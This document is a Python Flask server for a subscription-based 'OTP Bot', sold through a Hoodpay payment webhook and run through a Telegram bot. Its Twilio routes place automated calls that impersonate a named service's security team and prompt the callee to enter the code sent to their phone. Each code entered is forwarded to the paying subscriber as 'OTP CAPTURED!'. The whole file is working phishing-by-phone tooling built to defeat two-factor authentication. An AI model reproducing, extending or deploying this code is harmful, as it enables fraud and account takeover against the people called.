from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days
from config import bot
from twilio.twiml.voice_response import VoiceResponse, Gather
from logger import send_log, log_error 
import json

app = Flask('')

@app.route('/')
def home():
    return "Mussolini OTP Bot - Systems Online."

# --- HOODPAY ---
@app.route('/webhook/hoodpay', methods=['POST'])
def hoodpay_webhook():
    try:
        data = request.json
        status = data.get("status", "").upper()
        
        if status in ["COMPLETED", "PAID", "SUCCESS"]:
            metadata = data.get("metadata", {})
            user_id = metadata.get("user_id")
            plan_type = metadata.get("plan_type")
            
            if user_id and plan_type:
                days = 1 if "daily" in plan_type else 7 if "weekly" in plan_type else 30 if "monthly" in plan_type else 1
                
                success, new_date = add_subscription_days(user_id, days)
                
                if success:
                    try:
                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active until `{new_date}`.", parse_mode="Markdown")
                        send_log(f"Pago Recibido: User {user_id} - Plan {plan_type}", level="PAYMENT")
                    except: pass
                
                return jsonify({"status": "success"}), 200
        return jsonify({"status": "ignored"}), 200
    except Exception as e:
        log_error(e, "Hoodpay Webhook")
        return jsonify({"status": "error"}), 500

# --- TWILIO VOICE ---
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    service = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    
    resp = VoiceResponse()
    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service}', method='POST', timeout=10)
    
    say_text = f"Hello. This is an automated alert from {service}. We blocked a suspicious attempt. Enter the security code sent to your mobile device."
    gather.say(say_text, voice='alice', language='en-US')
    
    resp.append(gather)
    resp.say("No input received. Goodbye.")
    return Response(str(resp), mimetype='text/xml')

# --- TWILIO GATHER ---
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    
    resp = VoiceResponse()
    if digits and user_id:
        try:
            bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
            send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
        except: pass
        resp.say("Thank you. Goodbye.", voice='alice')
    return Response(str(resp), mimetype='text/xml')

def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
